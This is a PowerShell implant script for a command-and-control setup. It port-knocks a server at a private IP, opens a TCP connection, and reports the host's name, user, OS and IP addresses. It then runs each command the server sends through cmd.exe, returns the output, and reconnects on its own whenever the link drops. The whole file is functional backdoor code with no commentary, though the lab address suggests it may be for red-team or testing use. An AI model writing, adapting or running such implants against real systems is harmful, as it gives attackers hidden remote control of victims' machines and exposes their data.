$ErrorActionPreference = "Stop"

$Config = @{
    ServerIP = "192.168.10.135"
    ServerPort = 2222
    Username = "implant"
    Password = "implant"
    KnockSequence = @(10000, 10001, 10002)
    ReconnectDelay = 5
    KeyExchangeTimeout = 10  # Seconds to wait for key exchange
}

function Perform-PortKnock {
    param ([string]$ServerIP, [int[]]$Sequence)
    try {
        foreach ($port in $Sequence) {
            Write-Host "[*] Knocking on port $port"
            $client = New-Object System.Net.Sockets.TcpClient
            $AsyncResult = $client.BeginConnect($ServerIP, $port, $null, $null)
            $Wait = $AsyncResult.AsyncWaitHandle.WaitOne(1000)
            $client.Close()
            Start-Sleep -Milliseconds 500
        }
        Write-Host "[+] Knock sequence completed"
        return $true
    } catch {
        Write-Warning "[-] Port knocking failed: $_"
        return $false
    }
}

function Get-SystemInfo {
    try {
        # Use Get-CimInstance instead of Get-WmiObject (which is deprecated in newer PowerShell)
        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
        
        # Fallback in case Get-CimInstance isn't available
        if ($null -eq $osInfo) {
            $osCaption = "Windows (version unknown)"
        } else {
            $osCaption = $osInfo.Caption
        }
        
        # Get IP addresses without using Get-NetIPAddress (for compatibility)
        $networkAdapters = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | 
            Where-Object { $_.OperationalStatus -eq 'Up' }
        
        $ipAddresses = @()
        foreach ($adapter in $networkAdapters) {
            $properties = $adapter.GetIPProperties()
            $addresses = $properties.UnicastAddresses | 
                Where-Object { $_.Address.AddressFamily -eq 'InterNetwork' -and 
                              $_.Address.ToString() -notmatch "^(127\.|169\.)" }
            
            if ($addresses) {
                $ipAddresses += $addresses | ForEach-Object { $_.Address.ToString() }
            }
        }
        
        return @{
            Hostname = [System.Net.Dns]::GetHostName()
            Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            OS = $osCaption
            IP = $ipAddresses -join ','
        }
    } catch {
        # Provide basic info if there's an error
        return @{
            Hostname = [System.Net.Dns]::GetHostName()
            Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            OS = "Error getting OS info"
            IP = "Error getting IP info"
        }
    }
}

function Invoke-RemoteCommand {
    param ([string]$Command)
    try {
        if ($Command -eq "exit") { return "Exiting..." }
        if ($Command.StartsWith("cd ")) {
            $newPath = $Command.Substring(3)
            Set-Location $newPath
            return "Changed directory to: $(Get-Location)"
        }
        
        # Create a new process to execute the command
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Command"
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $psi
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $error_output = $process.StandardError.ReadToEnd()
        $process.WaitForExit()
        
        if ($error_output) {
            return "Error: $error_output"
        }
        return $output -ne "" ? $output : "Command executed successfully (no output)"
    } catch {
        return "Error: $_"
    }
}

function Connect-ToC2Server {
    param ([hashtable]$Config)
    try {
        if (-not (Perform-PortKnock -ServerIP $Config.ServerIP -Sequence $Config.KnockSequence)) {
            throw "Port knocking failed"
        }

        Write-Host "[*] Setting up TCP connection to $($Config.ServerIP):$($Config.ServerPort)..."
        $client = New-Object System.Net.Sockets.TcpClient
        
        # Connect with timeout
        $connectResult = $client.BeginConnect($Config.ServerIP, $Config.ServerPort, $null, $null)
        $success = $connectResult.AsyncWaitHandle.WaitOne([TimeSpan]::FromSeconds(10))
        
        if (-not $success) {
            $client.Close()
            throw "Connection timed out"
        }
        
        try {
            $client.EndConnect($connectResult)
        } catch {
            throw "Failed to establish connection: $_"
        }
        
        if (-not $client.Connected) {
            throw "TCP Connection failed"
        }
        
        $stream = $client.GetStream()
        Write-Host "[+] Connected successfully"
        
        # Set up streams for communication
        $streamReader = New-Object System.IO.StreamReader($stream)
        $streamWriter = New-Object System.IO.StreamWriter($stream)
        $streamWriter.AutoFlush = $true
        
        # Send system info as identification
        $sysInfo = Get-SystemInfo
        $infoJson = ConvertTo-Json -InputObject $sysInfo -Compress
        $streamWriter.WriteLine("IMPLANT:$infoJson")
        
        return @{ 
            Client = $client
            Stream = $stream
            Reader = $streamReader
            Writer = $streamWriter
        }
    } catch {
        Write-Warning "[-] Connection error: $_"
        return $null
    }
}

function Start-ImplantLoop {
    param ([hashtable]$Config)
    
    while ($true) {
        $connection = Connect-ToC2Server -Config $Config
        
        if ($null -eq $connection) {
            Write-Host "[-] Failed to connect. Retrying in $($Config.ReconnectDelay)s."
            Start-Sleep -Seconds $Config.ReconnectDelay
            $Config.ReconnectDelay = [Math]::Min(300, $Config.ReconnectDelay * 1.5)
            continue
        }
        
        try {
            $client = $connection.Client
            $reader = $connection.Reader
            $writer = $connection.Writer
            
            # Reset reconnect delay on successful connection
            $Config.ReconnectDelay = 5
            
            Write-Host "[*] Waiting for commands..."
            
            while ($client.Connected) {
                # Check if there are bytes to read
                if ($client.Available -gt 0 -or $reader.Peek() -ne -1) {
                    $command = $reader.ReadLine()
                    
                    if ($command) {
                        Write-Host "[*] Command received: $command"
                        $output = Invoke-RemoteCommand -Command $command
                        
                        # Send the output back, with a special marker to indicate end of output
                        $writer.WriteLine($output)
                        $writer.WriteLine("CMD_OUTPUT_END")
                    }
                }
                
                # Simple heartbeat check - send empty packet every 60 seconds
                if ((Get-Date).Second -eq 0 -and (Get-Date).Millisecond -lt 200) {
                    $writer.WriteLine("HEARTBEAT")
                    Start-Sleep -Milliseconds 200  # Avoid multiple heartbeats
                }
                
                Start-Sleep -Milliseconds 100
            }
        } catch {
            Write-Warning "[-] Connection error: $_"
        } finally {
            # Clean up resources
            if ($null -ne $connection.Reader) { $connection.Reader.Close() }
            if ($null -ne $connection.Writer) { $connection.Writer.Close() }
            if ($null -ne $connection.Stream) { $connection.Stream.Close() }
            if ($null -ne $connection.Client) { $connection.Client.Close() }
        }
        
        Write-Host "[-] Connection lost. Reconnecting in $($Config.ReconnectDelay)s..."
        Start-Sleep -Seconds $Config.ReconnectDelay
    }
}

# Main execution
try {
    Write-Host "[*] Implant starting..."
    # No need for SSH.NET library - using standard .NET TCP functionality
    Start-ImplantLoop -Config $Config
} catch {
    Write-Error "[X] Critical error: $_"
}